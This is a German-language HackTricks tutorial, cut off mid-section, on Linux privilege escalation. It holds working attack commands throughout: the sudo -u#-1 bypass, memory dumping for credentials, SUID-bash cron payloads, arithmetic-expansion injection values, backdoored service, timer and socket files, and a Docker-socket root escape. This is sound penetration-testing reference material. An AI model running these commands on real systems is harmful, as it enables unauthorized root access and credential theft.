# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS info

Beginnen wir damit, Informationen über das laufende OS zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Wenn Sie **Schreibrechte für einen Ordner innerhalb der `PATH`-Variable haben**, können Sie möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Umgebungsinformationen

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Überprüfe die Kernel-Version und ob es einen exploit gibt, der verwendet werden kann, um escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du findest eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Webseite zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach kernel exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Suche immer **die Kernel-Version in Google**, vielleicht ist deine Kernel-Version bereits in einem kernel exploit erwähnt — dann weißt du, dass der Exploit gültig ist.

Zusätzliche kernel exploitation-Technik:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den in Folgendem aufgeführten anfälligen sudo-Versionen:
```bash
searchsploit sudo
```
Sie können prüfen, ob die sudo-Version verwundbar ist, indem Sie dieses grep verwenden.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) ermöglichen unprivilegierten lokalen Benutzern, ihre Rechte auf root zu eskalieren über die sudo `--chroot`-Option, wenn die Datei `/etc/nsswitch.conf` aus einem vom Benutzer kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), um diese [Schwachstelle](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) auszunutzen. Bevor du den Exploit ausführst, stelle sicher, dass deine `sudo`-Version anfällig ist und dass sie das `chroot`-Feature unterstützt.

Für weitere Informationen siehe die originale [Sicherheitsmeldung](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturüberprüfung fehlgeschlagen

Siehe **smasher2 box of HTB** für ein **Beispiel** dafür, wie diese vuln ausgenutzt werden könnte
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:

{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Überprüfe **was gemountet und ungemountet ist**, wo und warum. Wenn etwas ungemountet ist, kannst du versuchen, es zu mounten und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche Binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **ein Compiler installiert ist**. Das ist nützlich, falls du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn einsetzen willst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare Software installiert

Prüfe die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine alte Nagios-Version (zum Beispiel), die zur Eskalation von Privilegien ausgenutzt werden könnte…\ Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugriff auf die Maschine hast, kannst du auch **openVAS** verwenden, um nach veralteter und verwundbarer Software zu suchen, die auf der Maschine installiert ist.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen werden, die größtenteils nutzlos sind; daher werden Anwendungen wie OpenVAS oder ähnliche empfohlen, die prüfen, ob eine installierte Software-Version für bekannte exploits verwundbar ist_

## Prozesse

Schau dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Privilegien hat, als er haben sollte** (vielleicht läuft ein tomcat als root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den `--inspect` Parameter in der Befehlszeile des Prozesses überprüft.\
Also **check your privileges over the processes binaries**, vielleicht kannst du einen überschreiben.

### Process monitoring

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn eine Reihe von Bedingungen erfüllt sind.

### Process memory

Einige Services auf einem Server speichern **Zugangsdaten im Klartext im Speicher**.\
Normalerweise benötigst du **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören; daher ist das meist nützlicher, wenn du bereits root bist und weitere Zugangsdaten entdecken möchtest.\
Denke jedoch daran, dass **du als normaler Benutzer den Speicher der Prozesse lesen kannst, die du besitzt**.

> [!WARNING]
> Beachte, dass die meisten Maschinen heutzutage **ptrace nicht standardmäßig erlauben**, was bedeutet, dass du keine anderen Prozesse, die deinem unprivilegierten Benutzer gehören, dumpen kannst.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle Prozesse können debugged werden, solange sie die gleiche uid haben. Das ist die klassische Funktionsweise von ptracing.
> - **kernel.yama.ptrace_scope = 1**: nur ein Parent-Prozess kann debugged werden.
> - **kernel.yama.ptrace_scope = 2**: Nur Admin kann ptrace verwenden, da dafür die CAP_SYS_PTRACE capability erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace verfolgt werden. Nach dem Setzen ist ein Reboot erforderlich, um ptracing wieder zu ermöglichen.

#### GDB

Wenn du Zugriff auf den Speicher eines FTP-Service (zum Beispiel) hast, könntest du den Heap bekommen und darin nach seinen Zugangsdaten suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps, wie der Speicher im virtuellen Adressraum dieses Prozesses abgebildet ist**; sie zeigen auch die **Berechtigungen jeder abgebildeten Region**. Die Pseudo-Datei **mem** **legt den Speicher des Prozesses selbst offen**. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar sind** und deren Offsets. Wir verwenden diese Informationen, um in die Pseudo-Datei **mem** zu seeken und alle lesbaren Bereiche in eine Datei zu dumpen.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` gewährt Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Der virtuelle Adressraum des Kernels ist über /dev/kmem zugänglich.\
Typischerweise ist `/dev/mem` nur von **root** und der Gruppe **kmem** lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für linux

ProcDump ist eine für Linux neu gedachte Version des klassischen ProcDump-Tools aus der Sysinternals-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Um den Speicher eines Prozesses zu dumpen, können Sie folgende Tools verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können manuell die root-Anforderungen entfernen und den Prozess dumpen, der Ihnen gehört
- Script A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Credentials aus Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe frühere Abschnitte, um verschiedene Möglichkeiten zu finden, den Speicher eines Prozesses zu dumpen) und nach credentials im Speicher suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Zugangsdaten aus dem Speicher stehlen** und aus einigen **bekannten Dateien**. Es benötigt Root-Rechte, um ordnungsgemäß zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Wenn ein Web-“Crontab UI”-Panel (alseambusher/crontab-ui) als root läuft und nur an loopback gebunden ist, kannst du es trotzdem über SSH local port-forwarding erreichen und einen privileged job erstellen, um Privilegien zu eskalieren.

Typische Abfolge
- Entdecke einen nur auf loopback erreichbaren Port (z. B. 127.0.0.1:8000) und das Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Finde Credentials in betrieblichen Artefakten:
- Backups/Skripte mit `zip -P <password>`
- systemd unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` exponiert
- Tunnel und Login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen high-priv job und führe ihn sofort aus (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Verwende es:
```bash
/tmp/rootshell -p   # root shell
```
Härtung
- Führen Sie Crontab UI nicht als root aus; beschränken Sie es auf einen dedizierten Benutzer und minimale Berechtigungen
- Binden Sie an localhost und schränken Sie zusätzlich den Zugriff über firewall/VPN ein; verwenden Sie keine wiederverwendeten Passwörter
- Vermeiden Sie das Einbetten von Secrets in unit files; verwenden Sie secret stores oder eine root-only EnvironmentFile
- Aktivieren Sie audit/logging für on-demand Job-Ausführungen

Prüfen Sie, ob ein geplanter Job verwundbar ist. Vielleicht können Sie ausnutzen, dass ein Script von root ausgeführt wird (wildcard vuln? können Dateien ändern, die root verwendet? symlinks verwenden? bestimmte Dateien im Verzeichnis erstellen, die root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte für /home/user hat_)

Wenn in diesem crontab der root user versucht, einen Befehl oder ein Script auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, das ein Skript mit einem wildcard verwendet (Wildcard Injection)

Wenn ein von root ausgeführtes Skript ein “**\***” in einem Befehl enthält, kannst du dies ausnutzen, um unerwartete Dinge zu bewirken (z. B. privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das wildcard vor einem Pfad wie** _**/some/path/\***_ **steht, ist es nicht verwundbar (selbst** _**./\***_ **nicht).**

Lies die folgende Seite für weitere wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter expansion und command substitution vor der arithmetic evaluation in ((...)), $((...)) und let durch. Wenn ein root cron/parser untrusted log fields liest und diese in einen arithmetic context einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die als root ausgeführt wird, wenn der cron läuft.

- Why it works: In Bash erfolgen expansions in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Daher wird ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` zuerst substituiert (der Befehl wird ausgeführt), dann wird die verbleibende Zahl `0` für die arithmetic verwendet, sodass das Skript ohne Fehler fortfährt.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Veranlasse, dass attacker-controlled Text in das geparste Log geschrieben wird, sodass das numerisch-aussehende Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout schreibt (oder leite es um), damit die arithmetic gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Wenn du **ein cron script ändern kannst**, das als root ausgeführt wird, kannst du sehr leicht eine shell bekommen:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte script ein **directory where you have full access** verwendet, kann es nützlich sein, diesen Ordner zu löschen und einen **create a symlink folder to another one** anzulegen, der ein von dir kontrolliertes script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Mit eigener Signatur versehene cron-Binaries mit beschreibbaren payloads
Blue teams signieren manchmal cron-getriebene Binaries, indem sie eine eigene ELF-Section dumpen und mit `grep` nach einem Vendor-String suchen, bevor sie diese als root ausführen. Wenn dieses Binary group-writable ist (z. B. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) und du das signing material leakst, kannst du die Section fälschen und die cron-Aufgabe hijacken:

1. Verwende `pspy`, um den Verifikationsablauf aufzuzeichnen. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` gefolgt von `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` aus und anschließend wurde die Datei ausgeführt.
2. Erstelle das erwartete Zertifikat neu mit dem leaked key/config (aus `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Baue einen bösartigen Ersatz (z. B. drop a SUID bash, add your SSH key) und bette das Zertifikat in `.text_sig` ein, sodass der `grep` besteht:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe das geplante Binary und behalte die execute-Bits bei:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten cron-Lauf; sobald die naive Signaturprüfung erfolgreich ist, läuft dein payload als root.

### Häufige cron-Jobs

Du kannst Prozesse überwachen, um solche zu finden, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und Privilegien eskalieren.

Zum Beispiel, um **every 0.1s during 1 minute** zu **monitoren**, **nach den am wenigsten ausgeführten Befehlen zu sortieren** und die Befehle zu löschen, die am häufigsten ausgeführt wurden, kannst du folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies wird jeden gestarteten Prozess überwachen und auflisten).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man einen carriage return nach einem Kommentar setzt (ohne newline character), und der cron job wird funktionieren. Beispiel (achte auf das carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Beschreibbare _.service_ Dateien

Prüfe, ob du eine `.service`-Datei schreiben kannst; wenn ja, **kannst du sie verändern**, sodass sie **deinen backdoor ausführt, wenn** der Dienst **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du warten, bis die Maschine neu gestartet wird).\
Zum Beispiel erstelle deinen backdoor innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Service-Binaries

Beachte, dass wenn du **Schreibrechte auf Binärdateien hast, die von Diensten ausgeführt werden**, du diese ändern kannst, um backdoors einzubauen, sodass beim erneuten Ausführen der Dienste die backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH sehen mit:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in einem der Ordner des Pfads **schreiben** kannst, könntest du möglicherweise **Privilegien eskalieren**. Du musst nach **relativen Pfaden, die in service configurations files verwendet werden**, suchen wie:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann ein **executable** mit demselben Namen wie das Binary des relativen Pfads inside dem systemd PATH-Ordner, in den du schreiben kannst, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **backdoor** ausgeführt (nicht-privilegierte Benutzer können in der Regel keine Services starten/stoppen — prüfe jedoch, ob du `sudo -l` verwenden kannst).

**Mehr über Dienste erfährst du mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd Unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für Kalenderzeit-Ereignisse und monotonische Zeit-Ereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Beschreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, einige bestehende Einheiten von systemd.unit auszuführen (wie eine `.service` oder eine `.target`)
```bash
Unit=backdoor.service
```
In der Dokumentation können Sie nachlesen, was die Unit ist:

> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Wenn nicht angegeben, ist dieser Wert standardmäßig ein Service, der denselben Namen wie die Timer-Unit hat, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der zu aktivierende Unit-Name und der Unit-Name der Timer-Unit identisch benannt sind, abgesehen vom Suffix.

Daher müssten Sie, um diese Berechtigung auszunutzen:

- Finden Sie eine systemd-Unit (wie eine `.service`), die **ein beschreibbares Binary ausführt**
- Finden Sie eine systemd-Unit, die **einen relativen Pfad ausführt** und Sie haben **schreibbare Berechtigungen** über den **systemd PATH** (um dieses ausführbare Programm zu imitieren)

**Erfahren Sie mehr über Timer mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren benötigen Sie root-Rechte und müssen ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **Timer** durch das Erstellen eines Symlinks zu ihm unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird

## Sockets

Unix Domain Sockets (UDS) ermöglichen die **Kommunikation zwischen Prozessen** auf derselben oder unterschiedlichen Maschinen in Client-Server-Modellen. Sie verwenden Standard-Unix-Deskriptordateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber zusammenfassend werden sie verwendet, um **anzugeben, wo gelauscht werden soll** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder die zu überwachende Portnummer usw.).
- `Accept`: Erwartet ein boolesches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz gestartet** und nur das Verbindungs-Socket an diese übergeben. Wenn **false**, werden alle lauschenden Sockets selbst an die gestartete Service-Unit **übergeben**, und es wird nur eine Service-Unit für alle Verbindungen erzeugt. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, wo eine einzelne Service-Unit bedingungslos allen eingehenden Verkehr verarbeitet. **Standard ist false**. Aus Performance-Gründen wird empfohlen, neue Daemons so zu schreiben, dass sie mit `Accept=no` kompatibel sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen, die **vor** bzw. **nach** dem Erstellen und Binden der lauschenden **Sockets**/FIFOs **ausgeführt** werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **vor** bzw. **nach** dem Schließen und Entfernen der lauschenden **Sockets**/FIFOs **ausgeführt** werden.
- `Service`: Gibt den Namen der **Service**-Unit an, die bei **eingehendem Verkehr** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no erlaubt. Sie standardisiert auf den Service mit demselben Namen wie der Socket (mit entsprechend ersetzter Endung). In den meisten Fällen ist die Verwendung dieser Option nicht notwendig.

### Schreibbare .socket-Dateien

Wenn du eine **schreibbare** `.socket`-Datei findest, kannst du am Anfang der `[Socket]`-Sektion etwas wie `ExecStartPre=/home/kali/sys/backdoor` **hinzufügen**, und die Backdoor wird ausgeführt, bevor der Socket erstellt wird. Daher wirst du **wahrscheinlich warten müssen, bis die Maschine neu gestartet wird.**\
_Beachte, dass das System diese Socket-Dateikonfiguration verwenden muss, sonst wird die Backdoor nicht ausgeführt_

### Schreibbare Sockets

Wenn du einen **schreibbaren Socket** identifizierst (_jetzt sprechen wir über Unix Sockets und nicht über die Konfig-`.socket`-Dateien_), dann **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Unix Sockets auflisten
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es möglicherweise einige **sockets listening for HTTP** requests gibt (_Ich spreche nicht von .socket files, sondern von den Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem Befehl überprüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der Socket **mit einer HTTP-Anfrage antwortet**, kannst du **mit ihm kommunizieren** und möglicherweise **exploit some vulnerability**.

### Beschreibbarer Docker-Socket

Der Docker-Socket, häufig zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist dieser für den Benutzer `root` und Mitglieder der Gruppe `docker` beschreibbar. Schreibzugriff auf diesen Socket kann zu privilege escalation führen. Hier eine Aufschlüsselung, wie das gemacht werden kann und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du Schreibzugriff auf den Docker-Socket hast, kannst du escalate privileges mit den folgenden Befehlen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
